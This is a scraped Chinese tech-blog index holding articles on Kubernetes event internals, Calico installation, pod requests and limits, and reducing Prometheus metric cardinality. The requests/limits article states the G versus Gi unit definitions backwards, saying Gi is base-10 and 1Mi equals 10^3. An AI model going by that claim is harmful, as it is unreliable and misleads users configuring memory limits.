metav1.ObjectMeta `json:\u0026quot;metadata\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;` // 事件涉及的对象 InvolvedObject ObjectReference `json:\u0026quot;involvedObject\u0026quot; protobuf:\u0026quot;bytes,2,opt,name=involvedObject\u0026quot;` // 这里表示的是事件原因，通常为简短的的一种状态名称 // TODO: provide exact specification for format. // +optional Reason string `json:\u0026quot;reason,omitempty\u0026quot; protobuf:\u0026quot;bytes,3,opt,name=reason\u0026quot;` // 以人类可读取的方式描述，类似于 tcmpdump -A // TODO: decide on maximum length. // +optional Message string `json:\u0026quot;message,omitempty\u0026quot; protobuf:\u0026quot;bytes,4,opt,name=message\u0026quot;` // 报告事件的组件，通常包含这个结构体包含 “组件+主机名” 的结构 // +optional Source EventSource `json:\u0026quot;source,omitempty\u0026quot; protobuf:\u0026quot;bytes,5,opt,name=source\u0026quot;` // 首次上报事件的事件 // +optional FirstTimestamp metav1.Time `json:\u0026quot;firstTimestamp,omitempty\u0026quot; protobuf:\u0026quot;bytes,6,opt,name=firstTimestamp\u0026quot;` // 最近一次记录事件的事件 // +optional LastTimestamp metav1.Time `json:\u0026quot;lastTimestamp,omitempty\u0026quot; protobuf:\u0026quot;bytes,7,opt,name=lastTimestamp\u0026quot;` // 事件发生的次数 // +optional Count int32 `json:\u0026quot;count,omitempty\u0026quot; protobuf:\u0026quot;varint,8,opt,name=count\u0026quot;` // 事件的类型(Normal, Warning) // +optional Type string `json:\u0026quot;type,omitempty\u0026quot; protobuf:\u0026quot;bytes,9,opt,name=type\u0026quot;` // 首次观察到事件的. // +optional EventTime metav1.MicroTime `json:\u0026quot;eventTime,omitempty\u0026quot; protobuf:\u0026quot;bytes,10,opt,name=eventTime\u0026quot;` // 事件相关的序列，如果事件为单例事件，那么则为nil // +optional Series *EventSeries `json:\u0026quot;series,omitempty\u0026quot; protobuf:\u0026quot;bytes,11,opt,name=series\u0026quot;` // 对事件对象采取的行动 // +optional Action string `json:\u0026quot;action,omitempty\u0026quot; protobuf:\u0026quot;bytes,12,opt,name=action\u0026quot;` // Optional secondary object for more complex actions. // +optional Related *ObjectReference `json:\u0026quot;related,omitempty\u0026quot; protobuf:\u0026quot;bytes,13,opt,name=related\u0026quot;` // 发出事件的对应的控制器，也可以理解为组件，因为通常controller-manager 包含多个控制器 // e.g. `kubernetes.io/kubelet`. // +optional ReportingController string `json:\u0026quot;reportingComponent\u0026quot; protobuf:\u0026quot;bytes,14,opt,name=reportingComponent\u0026quot;` // 控制器实例的ID, e.g. `kubelet-xyzf`. // +optional ReportingInstance string `json:\u0026quot;reportingInstance\u0026quot; protobuf:\u0026quot;bytes,15,opt,name=reportingInstance\u0026quot;` } 事件管理器 通过上面知道了事件这个资源的设计，里面存在一个 ”发出事件的对应的控制器“ 那么必然是作为每一个组件的内置功能，也就是说这可以作为 client-go 中的一个组件。\n代码 vendor/k8s.io/client-go/tools/events/interfaces.go 中定义了一个事件管理器，这将定义了如何接收或发送事件到任何地方，例如事件接收器 (EventSink) 或 log\ntype EventBroadcaster interface { // 发送从指定的eventBroadcaster接收到的事件 StartRecordingToSink(stopCh \u0026lt;-chan struct{}) // 返回一个 EventRecorder 并可以使用发送事件到 EventBroadcaster，并将事件源设置为给定的事件源。 NewRecorder(scheme *runtime.Scheme, reportingController string) EventRecorder // StartEventWatcher 可以使在不使用 StartRecordingToSink 的情况下发送事件 // 这使得可以通过自定义方式记录事件 // NOTE: 在使用 eventHandler 接收到的事件时应先进行复制一份。 // TODO: figure out if this can be removed. StartEventWatcher(eventHandler func(event runtime.Object)) func() // StartStructuredLogging 可以接收 EventBroadcaster 发送的结构化日志功能 // 如果需要可以忽略返回值或使用于停止记录 StartStructuredLogging(verbosity klog.Level) func() // 关闭广播 Shutdown() } EventBroadcaster 的实现只有一个 eventBroadcasterImpl\ntype eventBroadcasterImpl struct { *watch.Broadcaster mu sync.Mutex eventCache map[eventKey]*eventsv1.Event sleepDuration time.Duration sink EventSink } 这里面最重要的就是 sink，sink就是决定如何去存储事件的一个组件，他返回的是一组 client-go 的 REST 客户端。\n事件管理器的设计 事件生产者 事件生产者在事件管理器中是作为\n控制器 service的资源创建很奇妙，继不属于 controller-manager 组件，也不属于 kube-proxy 组件，而是存在于 apiserver 中的一个被成为控制器的组件；而这个控制器又区别于准入控制器。更准确来说，准入控制器是位于kubeapiserver中的组件，而 控制器 则是存在于单独的一个包，这里包含了很多kubernetes集群的公共组件的功能，其中就有service。这也就是在操作kubernetes时 当 controller-manager 于 kube-proxy 未工作时，也可以准确的为service分配IP。\n首先在构建出apiserver时，也就是代码 cmd/kube-apiserver/app/server.go\nserviceIPRange, apiServerServiceIP, err := master.ServiceIPRange(s.PrimaryServiceClusterIPRange) if err != nil { return nil, nil, nil, nil, err } master.ServiceIPRange 承接了为service分配IP的功能，这部分逻辑就很简单了\nfunc ServiceIPRange(passedServiceClusterIPRange net.IPNet) (net.IPNet, net.IP, error) { serviceClusterIPRange := passedServiceClusterIPRange if passedServiceClusterIPRange.IP == nil { klog.Warningf(\u0026quot;No CIDR for service cluster IPs specified. Default value which was %s is deprecated and will be removed in future releases. Please specify it using --service-cluster-ip-range on kube-apiserver.\u0026quot;, kubeoptions.DefaultServiceIPCIDR.String()) serviceClusterIPRange = kubeoptions.DefaultServiceIPCIDR } size := integer.Int64Min(utilnet.RangeSize(\u0026amp;serviceClusterIPRange), 1\u0026lt;\u0026lt;16) if size \u0026lt; 8 { return net.IPNet{}, net.IP{}, fmt.Errorf(\u0026quot;the service cluster IP range must be at least %d IP addresses\u0026quot;, 8) } // Select the first valid IP from ServiceClusterIPRange to use as the GenericAPIServer service IP. apiServerServiceIP, err := utilnet.GetIndexedIP(\u0026amp;serviceClusterIPRange, 1) if err != nil { return net.IPNet{}, net.IP{}, err } klog.V(4).Infof(\u0026quot;Setting service IP to %q (read-write).\u0026quot;, apiServerServiceIP) return serviceClusterIPRange, apiServerServiceIP, nil } 而后kube-apiserver为service分为两类\napiserver 地址在集群内的service，在代码中表示为 APIServerServiceIP Service，--service-cluster-ip-range 配置指定的ip，通过『逗号』分割可以为两个 有了对 service 更好的理解后，接下来开始本系列第二节深入理解Kubernetes service - kube-proxy软件架构分析\nReference\n[1] dual-stack service\n","permalink":"https://www.oomkill.com/2023/06/kubernetes-event/","summary":"","title":"源码分析 - Kubernetes中的事件通知机制"},{"content":"开始前的实验环境 Resources controller worker-1 worker-2 OS CentOS 7.9 CentOS 7.9 CentOS 7.9 Storage 20GB 20GB 20GB vCPU 2 2 2 RAM 4GB 4GB 4GB NIC 10.0.0.4 10.0.0.4 10.0.0.4 Kubernetes Version 1.19.10 1.19.10 1.19.10 选择匹配 Kubernetes 版本的 Calico 版本 通常情况下，查看 Calico 所支持的 Kubernetes 版本，可以通过路径 Install Calico ==\u0026gt; Kubernetes ==\u0026gt; System requirements 可以找到自己的 Kubernetes 集群所支持的 Calico 版本。\n例如在实验环境中，Kubernetes 1.19 版本所支持的版本有 Calico 3.20，这个时候直接 apply 这个版本提供的资源清单即可\n如何开启纯 BGP 模式 默认情况下下，Calico 使用的是 full mesh 和 IPIP， 如果想通过在部署时就修改关闭 IPIP 模式，可以通过修改资源清单中的环境变量来关闭 CALICO_IPV4POOL_IPIP: Never。\n如果需要在安装时配置Pod 的 CIDR，需要修改 CALICO_IPV4POOL_CIDR\n如果你需要切换 CNI 如果你的集群不是空的，而是存在很多 Pod 的集群，请注意，这个时候你的 flannel 或者其他 CNI 生成的网络接口是不会被销毁的，Pod 的 IP也是旧 CNI 生成的网段，此时 Calico 会按照原有的 IP 进行维护路由，可能会存在访问不了的情况，这时候不要随意切换 CNI\n如何检查 Calico 使用的是什么模式 在使用默认的资源清单安装完 Calico 后，实际上此时会表现为 BGP + IPIP 隧道模式，同节点 Pod 使用直连方式，跨节点 Pod 通讯使用 tunnel 隧道完成，表现形式为 ip addr 会看到 tunl0 设备\n如果是纯 BGP 模式，那么表现形式为 route -n 看到的路由跨节点的都应该是 eth0 这样子的，如下所示\n$ route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 10.0.0.2 0.0.0.0 UG 0 0 0 eth0 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 10.244.196.128 0.0.0.0 255.255.255.255 UH 0 0 0 calia5f3c234a97 10.244.196.128 0.0.0.0 255.255.255.192 U 0 0 0 * 10.244.214.0 10.0.0.4 255.255.255.192 UG 0 0 0 eth0 169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0 172.17.0.0 0.0.0.0 255.255.0.0 U 0 0 0 docker0 当然此时一定是不存在 tunl0 设备的。\nReference [1] BGP configuration\n[2] BGP peer\n[3] IP pool\n[4] System requirements\n","permalink":"https://www.oomkill.com/2023/06/calico-cni-deplyment/","summary":"","title":"在Kubernetes集群上安装 Calico cni 的注意事项"},{"content":" 原作者 Javier Martínez\n背景 在学习 Kubernetes 调度时，有两个重要的概念，\u0026ldquo;request \u0026ldquo;与 \u0026ldquo;limit\u0026rdquo;，而对应的资源就是“内存” 与 “CPU” ，而这两个决定了 Pod 将如何调度；\u0026ldquo;request \u0026ldquo;与 \u0026ldquo;limit\u0026rdquo; 也是整个调度系统中的基数因子。\n什么是 request 和 limit 在 Kubernetes 中，Limit 是容器可以使用的最大资源量，这表示 “容器” 的内存或 CPU 的使用，永远不会超过 Limit 配置的值。\n而另一方面，Request 则是为 “容器” 保留的最低资源保障；换句话来说，Request 则是在调度时，容器被允许所需的配置。\n图：Kubernetes 中Limit 和 Request 图示 Source：https://sysdig.com/blog/kubernetes-limits-requests/ 如何配置 request 和 limit 下列清单是 Deployment 的部署清单，他将部署一个 redis 与 一个 busybox\nkind: Deployment apiVersion: extensions/v1beta1 … template: spec: containers: - name: redis image: redis:5.0.3-alpine resources: limits: memory: 600Mi cpu: 1 requests: memory: 300Mi cpu: 500m - name: busybox image: busybox:1.28 resources: limits: memory: 200Mi cpu: 300m requests: memory: 100Mi cpu: 100m 假设现有集群，具有 4 核CPU 和 16GB RAM 节点。此时可以提取出的信息如下：\nPod Request 是 400 MiB 内存和 600 毫核 CPU (Redis+busybox)。而调度需要一具有足够可用可分配空间的Node\n来调度 Pod。\nredis的 CPU 为 512，busybox 容器的 CPU 份额为 102，Kubernetes 为每个核心分配 1024 个份额，因此 redis：1024 * 0.5 个核心 ≅ 512 与 busybox：1024 * 0.1 个核心 ≅ 102\n如果 Redis 容器尝试分配超过 600MB 的内存，则它会被 OOM 终止\n如果 Redis 每 100 毫秒超过超过 100 毫秒时的 CPU，（Node有 4 个核，可用时间为每 100 毫秒 400 毫秒时），Redis 将受到 CPU 限制，从而导致性能下降**。**\n如果 Busybox 容器试图分配超过 200MB 的内存，它将被 OOM 终止\n如果Busybox尝试每 100 毫秒使用超过 30 毫秒的 CPU\nRequest 通过上面示例，可以下定义了，Kuberentes 将 Request 定义为容器的 最小资源量。\n当一个 Pod 被调度时，kube-scheduler 将检查 Kubernetes 请求，以便将该 Pod 分配到最佳节点，该节点至少可以满足 Pod 中所有容器的数量。如果 Request 的数量高于可用资源，则 Pod 将不会被调度并保持在 Pending 状态。\n例如下列例子\nresources: requests: cpu: 0.1 memory: 4Mi 使用请求：\n将 Pod 分配给 Node 时，满足 Pod 中容器指示的 Request 。\n在运行时，指示的 Request 将保证为该 Pod 中的容器的最小 Request 。\n图：如何最佳的分配资源 Source：https://sysdig.com/blog/kubernetes-limits-requests/ Limit Limit 在 Kubernetes 为定义容器可以使用的最大资源量。这代表容器永远不会超过 Limit 配置的 内存 或 CPU 。\nresources: limits: cpu: 0.5 memory: 100Mi 在调度时，如果没有配置 Request，默认 Kubernetes 将设置 requests = limits。 调度后，运行时，kubelet 检查 Pod 中的容器是否消耗了比 Limit 中配置的更多的资源。 CPU 和 内存的特性 CPU 是一种 “可压缩资源”，这意味着它可以被拉伸以满足所有需求。如果进程申请了太多 CPU，其中一些将被限制。\n可以使用 millicores (m) 来表示比1核心更小的数量 CPU 最小量为 1m 内存是一种 “不可压缩的” 资源，这意味着内存资源不能像 CPU 资源那样被拉伸。如果一个进程没有足够的内存来工作，这个进程就会被 OOM。\n内存资源在 Kubernetes 中的单位是以字节为单位，可以使用大写的 E、P、T、G、M、k 来表示 Exabyte、Petabyte、Terabyte、Gigabyte、Megabyte 和 kilobyte，例如 4G, 500M；也可以使用 Ei、Pi、Ti，例如 500Mi\n**G 和 Gi ** 的区别：**G 和 Gi **区别主要在计算方式上，G是按照 2 的 n 次方进行计算，例如 1KB = $2^{10}$，而 Gi 计算方式是按照 10 的 n 次方，例如 1Mi = $10^3$\nNote：不要使用小写的 “m” ，这代表 Millibytes\nResource/LimitQuota - 基于名称空间的资源限制 ResourceQuotas 在 Kubernetes 集群中提供了基于名称空间的资源隔离，我们可以将资源隔离到不同的名称空间中，也称为租户；例如可以 为整个命名空间设置内存或 CPU 限制，确保名称空间内的业务不能从使用更多的系统资源。\n下列是一个 ResourceQuotas 的配置\napiVersion: v1 kind: ResourceQuota metadata: name: mem-cpu-demo spec: hard: requests.cpu: 2 requests.memory: 1Gi limits.cpu: 3 limits.memory: 2Gi requests.cpu：名称空间中所有 Request 的最低 CPU 数量 requests.memory：名称空间中所有 Request 的 最低内存数量 limits.cpu：名称空间中所有 Limit 最大 CPU 数量 limits.memory：名称空间中所有 Limit 最大内存量 ResourceQuotas 可限制名称空间的资源总量，如果我们想给里名称空间里的 Pod 配置限制可以使用 “LimitRange”\n下列是一个 LimitRanges 的配置\napiVersion: v1 kind: LimitRange metadata: name: cpu-resource-constraint spec: limits: - default: cpu: 500m defaultRequest: cpu: 500m min: cpu: 100m max: cpu: \u0026quot;1\u0026quot; type: Container default: 如果未指定，创建的容器将具有此值。 min：创建的容器不能有小于此的限制或请求。 max: 创建的容器不能有比这更大的限制或请求。 Note: 在默认情况下，即使未设置 LimitRanges，Pod 中的所有容器也会有效地请求 100m 的 CPU。\n总结 Request 和 Limit 是在 Kubernetes 集群中控制成本的关键配置 只有巧用 Request 和 Limit 才可以为集群提供最佳配额 专用的 容器不应该设置 Request 和 Limit，这将导致容器无法正常允许，甚至被驱逐 只有对 Request 和 Limit 进行精细的设置才可以使 Kubernetes 集群最佳化，否则 “弊大于利” ","permalink":"https://www.oomkill.com/2023/06/kubernetes-limit-request/","summary":"","title":"Kubernetes中的资源限制 - Request\u0026Limit"},{"content":"背景 对于整个 Kubernetes 集群来说，随着业务不断地打磨，新增指标，那么对于 Prometheus 特性来说，那么内存 与 存储的使用势必是增加。这是对于存储压力是很重的，通常情况下，使用 Prometheus，都会是用于 Kubernetes 集群中，而 应用于 Kubernetes 集中的存储势必是 PVC 之类的网络存储。\n这种场景中，我将尝试拆解如何分析和配置 Prometheus 以显著的减少其资源使用并解决高基数问题\n高基数 基数 (cardinality) 通俗来说是一个集合中的元素数量 [1] 基数的来源通常为：\nlabel 的数量 series(指标) 的数量 时间：label 或者 series 随时间而流失或增加，通常是增加 那么这么看来高基数就是，label, series, 时间这三个集合的笛卡尔积，那么高基数的情况就很正常了。\n而高基数带来的则是 Prometheus 资源使用，以及监控的性能。下图是 Grafana Lab 提到的一张图，很好的阐述了高基数这个问题\n图：Prometheus中的基数 Source：https://grafana.com/blog/2022/02/15/what-are-cardinality-spikes-and-why-do-they-matter\n如图所示：一个指标 server_responses 他的 label 存在两个 status_code 与 environment ，这代表了一个集合，那他的 label value 是 1~5xx，这个指标的笛卡尔积就是10。\n那么此时存在一个问题，如何能定位 基数高不高，Grafana Lab 给出了下面的数据 [1]，但是我不清楚具体的来源或者如何得到的这些值。也就是 label:value\n低基数：1: 5 标准基数：1: 80 高基数：1: 10000 为什么指标会指数级增长 在以 Kubernetes 为基础的架构中，随着抽象级别的提高（通常为Pod, Label, 以及更多抽象的拓扑），指标的时间序列也越来越多。因为在这种基础架构中，在传统架构中运行的一个应用的单个裸机，被许多运行分散在许多不同节点上的许多不同微服务的 Pod 所取代。在这些抽象层中的每一个都需要一个标签，以便可以唯一地标识它们，并且这些组件中的每一个都会生成自己的指标，从而创建其独特的时间序列集。\n此外，在 Kubernetes 中的工作负载的短暂性最终也会创建更多的时间序列。例如 JAVA的 http_request_duration_seconds_bucket 指标，它会每次 pod 更改状态时生成一个新的时间序列，比如从“状态200\u0026quot; 或者 “状态 404” 在到 “每个URL” 再到 “每个请求的时间”，这样大量短时间请求，对一个 Pod 状态可能会生成大量指标。\n这是就要考虑到 Prometheus 兼容的格式，而非传统监控的监控指标的格式问题，就例如上面的例子，通过对 URI，请求时长，请求状态码几个维度去监控，那么此时的 exporter 导出的数据势必是非常杂乱的，而这种可能相同的指标就会放大到无穷。\n在这种环境中的 Label，就是两组集合的笛卡尔积的选择，就是次优标签 sub-optimal labels ，对付这类高基数的指标，控制基数，以及如何避免使用这类错误，就是解决高基数的根本。\n高基数是一个非常重要的问题 高基数的问题，带来的就是基于 Prometheus 的监控带来的是更多的可观测性，反之，随着时间序列的基数增加，那么为了维持某几个特别的指标的观测性，就必须要付出更多的硬件资源，以及影响本身监控系统的性能。比较明显的表现，就是监控的相应下降，极大的拖慢了整个系统的运行速度（包含仪表盘，promQL等）。还会延长系统故障排除时的MTTR (Mean Time to Repair)。\nNotes: 其实这里还有一类型错误，就是这会导致时间序列的乱序，怎么说呢，就是当指标无线放大时，在某一个点 scrap 的指标存储时间，大于了抓取周期，导致新指标存储早于旧指标，这种很容易出现在例如 Prometheus 的从内存到存储的那个点。\n如何控制控制指标的高基数增长 指标的无序扩张（高基数）是不可避免对监控系统产生非常大的影响（存储和性能），而为此引出了一个如何优化不断增长的指标就是控制高基数增长的关键部分，下面将从几个维度来阐释控制“高基数”问题的步骤\n第一步：高基数指标是否有价值？ 在任何优化方法的第一步都是去了解哪些指标给系统带来负面影响（这里指高基数），并且还需要确定这些指标中哪些指标是有价值的；所谓的有价值既，在仪表板、告警中是否有被使用。\n基于这些信息，我将根据基数问题与监控指标的价值分为四个象限：\n高价值，低成本：闲置、陈旧、很长时间没有新数据的 低价值，低成本：基本上没有什么影响，但是需要去考虑优化 低价值，高成本：可以考虑删除掉 Label 和 metric 高价值，高成本：你的指标是否过细化，是否需要重新设计 Label 或者聚合数据；或这类指标是否适合使用 Prometheus 这类时间序列 第二步：如何确定高基数指标 确定高基数指标包含3种方式\nPrometheus WEB UI 分析，2.14 版本之后 PromQL 分析 Prometheus API 分析 通常情况下，WEB UI 就可以满足需求了，通过路径 Prometheus UI -\u0026gt; Status -\u0026gt; TSDB Status -\u0026gt; Head Cardinality Stats。\n图：Prometheus WEB UI TOP 10 series 查看上图可见，http_server_requests_seconds_bucket 的信息，就这个 bucket 指标占总指标的 25% 左右，在加上其他的 几个 bucket，10个基本上占用了60%；在这里体现的高基数问题的指标，通常都是以 bucket 结尾的指标，而这些指标通常包含2个维度，会无线拉长成为高基数指标。如下面指标所示，通常由 le （标识每个 bucket 的上限，这可以确保可以定位到在一个时间范围内相应的请求指标有哪些）\nhttp_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/map\u0026quot;,le=\u0026quot;+Inf\u0026quot;,} 71.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.001\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.001048576\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.001398101\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.001747626\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.002097151\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.002446676\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.002796201\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.003145726\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.003495251\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.003844776\u0026quot;,} 0.0 http_server_requests_seconds_bucket{application=\u0026quot;map-common-api\u0026quot;,exception=\u0026quot;None\u0026quot;,method=\u0026quot;POST\u0026quot;,outcome=\u0026quot;SUCCESS\u0026quot;,status=\u0026quot;200\u0026quot;,uri=\u0026quot;/api/v1/maplist\u0026quot;,le=\u0026quot;0.004194304\u0026quot;,} 0.0 例如下面是生产环境中的一个高基数TOP10\nDC01 Top 10 series count by metric names\nName Count http_server_requests_seconds_bucket 1282158 lettuce_command_completion_seconds_bucket 782680 lettuce_command_firstresponse_seconds_bucket 782680 nginx_ingress_controller_response_size_bucket 99840 nginx_ingress_controller_request_duration_seconds_bucket 99840 http_server_requests_seconds 92695 nginx_ingress_controller_request_size_bucket 91520 nginx_ingress_controller_response_duration_seconds_bucket 74580 nginx_ingress_controller_bytes_sent_bucket 66560 node_ipvs_backend_weight 51173 DC02 Top 10 series count by metric names\nName Count http_server_requests_seconds_bucket 1073571 lettuce_command_firstresponse_seconds_bucket 755650 lettuce_command_completion_seconds_bucket 755650 http_server_requests_seconds 77775 nginx_ingress_controller_request_duration_seconds_bucket 67440 nginx_ingress_controller_response_size_bucket 67440 nginx_ingress_controller_request_size_bucket 61820 nginx_ingress_controller_response_duration_seconds_bucket 53052 node_ipvs_backend_connections_inactive 48796 node_ipvs_backend_connections_active 48796 至此可以看到实际上 http_server_requests_seconds_bucket 这一个指标占据了 prometheus 总指标的50%+；这种指标就会存在多个维度的扩张，URI, outcome, status,uri,le；假设我们有 100个 接口，\n在什么都不做的情况下，就多出了100个 series 如果状态码是存在变数的，假设为5，此时series 为500 在基于 outcome 的数量，此时一个指标的基数已经为1000 那么 le 将无限放大这个 metric 到 无穷 这样就可以定位，影响到 prometheus 存储于性能最大点在哪里，那么此时就需要考虑 le=\u0026ldquo;0.001048576\u0026rdquo; 和 le=\u0026ldquo;0.001\u0026rdquo; 有什么区别，以及此类的指标是否有必要存在？\n基于我们现有的监控报表来看 结合业务日志将访问信息的监控从 Prometheus 提到 ELK 这种日志层面监控 再通过 将 kube-apiserver 的 bucket 以及负载均衡在线/不在线Pod 这两个 指标清空，基本上可以满足70%左右的监控项删减 通常会删掉 le 这个标签，而不是 http_server_requests_seconds_bucket 的数据，但是也需要考虑，http_server_requests_seconds_bucket 指标是否有用到，如果没有用到， 又是高基数，那么可以删除 而其他的一些分析，可以很有效的定位到你需要优化的标签\nTop 10 label names with high memory usage Top 10 series count by label value pairs 通过 promQL 定位 job 查询 top 10 的 series topk(10, count by (__name__)({__name__=~\u0026quot;.+\u0026quot;})) sum(scrape_series_added) by (job) 通过 job Label 分析 series 增长 sum(scrape_samples_scraped) by (job) 通过 job Label 分析 series 总量 可以通过指标属于哪个 job\n第三步：发现那些指标没有在使用 Grafana Mimirtool 是一个开源的命令行工具， 它可以识别 Mimir、Prometheus 或 Prometheus 的存储中未在Dashboard、Alert 或 recording 中使用的指标。通过 Mimirtool 可以快速发现未使用的指标，并且做出操作\n优化监控指标 优化监控指标来解决高基数问题主要从以下维度进行\n增加采集间隔 Prometheus 的默认值为 scrape_interval: 15s，或 DPM (Data points Per minute) 4个，但是如果查询语句为 scrape_samples_scraped[1m] 那么可以考虑将这个 job 的 scrape_interval 增加为1m，这样15~60 可以减少近75%的存储成本。\nkube-state-metrics: namespaceOverride: \u0026quot;\u0026quot; rbac: create: true releaseLabel: true prometheus: monitor: enabled: true ## Scrape interval. If not set, the Prometheus default scrape interval is used. ## interval: \u0026quot;\u0026quot; 优化 histogram histrogram 是 Prometheus中一种更具有更复杂类型的监控指标，通常用于决定数据的精度，典型的例子就是上面提到的 http_server_requests_seconds_bucket 中的 le ，此时假设 le 代表请求毫秒，那么我们只需要决定你所需要的精度是哪些？例如，如果仅仅需要 1ms, 5ms, 10ms，那么指标 le 标签就控制为3，这样结合 URI 指标，那么这个 histogram 是有限的\n# drop all metric series ending with _bucket and where le=\u0026quot;0.1xxx\u0026quot; - source_labels: [__name__, le] separator: _ regex: \u0026quot;.+_bucket_(0.1+)\u0026quot; action: \u0026quot;drop\u0026quot; # Object labels: __name__: http_server_requests_seconds_bucket le: 0.114421 这里可以通过 promlabs 来测试你的规则是否是成功的 [2]\n删除不需要的标签 对于一些指标，删除了未使用的标签后，反而会使这个指标变得没有意义，并且使这个指标变得序列重复，这个时候可以完整删除这个指标\n例如在下面的示例中，第一个示例可以安全地删除 ip 标签，因为其余系列都是唯一的。但在第二个示例中，如果删除 ip 标签将产生重复的时间序列，Prometheus 将删除这些时间序列。my_metric_total在此示例中，Prometheus 将接收具有相同时间戳的值 1、3 和 7，并将丢弃其中的 2 个数据点。\n# You can drop ip label, remaining series are still unique my_metric_total{env=“dev”, ip=“1.1.1.1\u0026quot;} 12 my_metric_total{env=“tst”, ip=“1.1.1.1\u0026quot;} 14 my_metric_total{env=“prd”, ip=“1.1.1.1\u0026quot;} 18 #Remaining values after dropping ip label my_metric_total{env=“dev”} 12 my_metric_total{env=“tst”} 14 my_metric_total{env=“prd”} 18 # You can not drop ip label, remaining series are not unique my_metric_total{env=“dev”, ip=“1.1.1.1\u0026quot;} 1 my_metric_total{env=“dev”, ip=“3.3.3.3\u0026quot;} 3 my_metric_total{env=“dev”, ip=“5.5.5.5\u0026quot;} 7 #Remaining values after dropping ip label are not unique my_metric_total{env=“dev”} 1 my_metric_total{env=“dev”} 3 my_metric_total{env=“dev”} 7 如果无法控制删除标签将导致重复序列，通过 Prometheus sum、avg、min、max等函数可以保留聚合数据，同时删除单个系列。在下面的示例中，我们使用 sum 函数来存储聚合指标，从而允许我们删除单个时间序列。\n# sum by env my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;1.1.1.1\u0026quot;} 1 my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;3.3.3.3\u0026quot;} 3 my_metric_total{env=\u0026quot;dev\u0026quot;, ip=\u0026quot;5.5.5.5\u0026quot;} 7 # Recording rule sum by(env) (my_metric_total{}) my_metric_total{env=\u0026quot;dev\u0026quot;} 11 使用聚合组 例如对于 *_seconds_bucket 类的指标, 通常需要的是一些高纬度的指标，那么这些指标可以通过 recording rules 进行记录和存储\ngroups: - interval: 3m name: kube-apiserver-availability.rules rules: - expr: \u0026gt;- avg_over_time(code_verb:apiserver_request_total:increase1h[30d]) * 24 * 30 record: code_verb:apiserver_request_total:increase30d - expr: \u0026gt;- sum by (cluster, code, verb) (increase(apiserver_request_total{job=\u0026quot;apiserver\u0026quot;,verb=~\u0026quot;LIST|GET|POST|PUT|PATCH|DELETE\u0026quot;,code=~\u0026quot;2..\u0026quot;}[1h])) record: code_verb:apiserver_request_total:increase1h - expr: \u0026gt;- sum by (cluster, code, verb) (increase(apiserver_request_total{job=\u0026quot;apiserver\u0026quot;,verb=~\u0026quot;LIST|GET|POST|PUT|PATCH|DELETE\u0026quot;,code=~\u0026quot;5..\u0026quot;}[1h])) record: code_verb:apiserver_request_total:increase1h 最后 drop 掉指标\nwrite_relabel_configs: - source_labels: [__name__] 